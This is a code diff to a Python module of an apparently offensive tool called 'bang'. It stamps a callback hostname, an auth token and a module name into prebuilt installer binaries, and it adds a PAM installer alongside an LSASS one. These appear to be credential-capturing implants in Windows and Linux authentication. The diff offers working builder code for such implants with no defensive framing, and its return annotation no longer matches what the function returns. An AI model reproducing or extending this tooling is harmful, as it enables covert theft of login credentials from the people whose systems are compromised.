@@ -1,10 +1,13 @@
 from importlib import resources
 import uuid
 
-BANG_INSTALLER_PATH = resources.files("bang") / "static" / "bang" / "binaries" / "installer.exe"
+BANG_BINARIES_DIR = resources.files("bang") / "static" / "bang" / "binaries"
+
+BANG_INSTALLER_LSASS = BANG_BINARIES_DIR / "lsass" / "installer.exe"
+BANG_INSTALLER_PAM = BANG_BINARIES_DIR / "pam" / "installer"
 
 # stamped configuration values - found and replaced in the installer binary
-BANG_SSP_NAME_STAMP = "BASKETBALLJONES".encode("utf-16-le")
+BANG_MODULE_NAME_STAMP = "BASKETBALLJONES".encode("utf-16-le")
 BANG_HOSTNAME_STAMP = "EVERYBODYGETUP".encode("utf-16-le")
 BANG_AUTH_TOKEN_STAMP = "00000000-0000-0000-0000-000000000000".encode("utf-16-le")
 
@@ -18,10 +21,13 @@ def _stamp_value(binary: bytes, stamp_pattern: bytes, stamp_data: bytes) -> byte
     )
 
 
-def configure_bang_installer(hostname: str, auth_token: str, provider_name: str) -> bytes:
-    with open(BANG_INSTALLER_PATH, "rb") as f:
+def configure_bang_installer(hostname: str, auth_token: str, module_name: str, target: str) -> bytes:
+    installer_path = BANG_INSTALLER_LSASS if target == "lsass" else BANG_INSTALLER_PAM
+    with open(installer_path, "rb") as f:
         installer_bin = f.read()
+
     installer_bin = _stamp_value(installer_bin, BANG_HOSTNAME_STAMP, hostname.encode("utf-16-le"))
     installer_bin = _stamp_value(installer_bin, BANG_AUTH_TOKEN_STAMP, auth_token.encode("utf-16-le"))
-    installer_bin = _stamp_value(installer_bin, BANG_SSP_NAME_STAMP, provider_name.encode("utf-16-le"))
-    return installer_bin
+    installer_bin = _stamp_value(installer_bin, BANG_MODULE_NAME_STAMP, module_name.encode("utf-16-le"))
+
+    return installer_bin, installer_path.name
